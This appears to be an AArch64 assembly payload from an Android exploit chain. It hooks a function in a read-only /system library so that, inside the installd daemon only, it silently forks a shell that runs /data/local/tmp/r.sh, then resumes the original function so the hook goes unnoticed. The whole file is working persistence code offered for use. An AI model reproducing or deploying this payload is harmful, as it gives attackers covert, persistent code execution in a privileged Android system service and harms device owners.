/*
 * payload_libhook.S -- generic COLD-function hook payload for a /system (erofs)
 * library.  A 4-byte `b <H_off>` is written at the target function T's entry;
 * this payload lives at H_off (overwriting a practically-unused function H in
 * the same library, so no cross-library base is needed).
 *
 * Gate on getpid()==installd: only installd spawns the persistent channel.
 * Every path replays T's original first instruction and branches to T+4, so
 * the hooked function keeps working for all other callers.
 *
 * Substituted by build_libhook.sh: @PID@, @T0@ (target's first insn word).
 */
	.section .text
	.global _start
_start:
	sub	sp, sp, #0x60
	stp	x0, x1, [sp, #0x00]
	stp	x2, x3, [sp, #0x10]
	stp	x4, x5, [sp, #0x20]
	stp	x6, x7, [sp, #0x30]
	str	x8, [sp, #0x40]
	mov	x8, #172		/* getpid */
	svc	#0
	movz	w1, #@PID@
	cmp	w0, w1
	b.ne	restore
	mov	x0, #17			/* SIGCHLD */
	mov	x1, xzr
	mov	x2, xzr
	mov	x3, xzr
	mov	x4, xzr
	mov	x8, #220		/* clone */
	svc	#0
	cbz	x0, child
restore:
	ldp	x0, x1, [sp, #0x00]
	ldp	x2, x3, [sp, #0x10]
	ldp	x4, x5, [sp, #0x20]
	ldp	x6, x7, [sp, #0x30]
	ldr	x8, [sp, #0x40]
	add	sp, sp, #0x60
	.inst	@T0@			/* target's original first instruction */
	b	T4			/* target+4 */
child:
	sub	sp, sp, #0x30
	adr	x0, s_arg0
	str	x0, [sp]
	adr	x0, s_script
	str	x0, [sp, #8]
	str	xzr, [sp, #16]
	adr	x0, s_sh
	mov	x1, sp
	mov	x2, xzr
	mov	x8, #221		/* execve */
	svc	#0
	mov	x0, #0
	mov	x8, #93			/* exit */
	svc	#0
	.balign 8
s_sh:		.asciz "/system/bin/sh"
s_arg0:		.asciz "sh"
s_script:	.asciz "/data/local/tmp/r.sh"
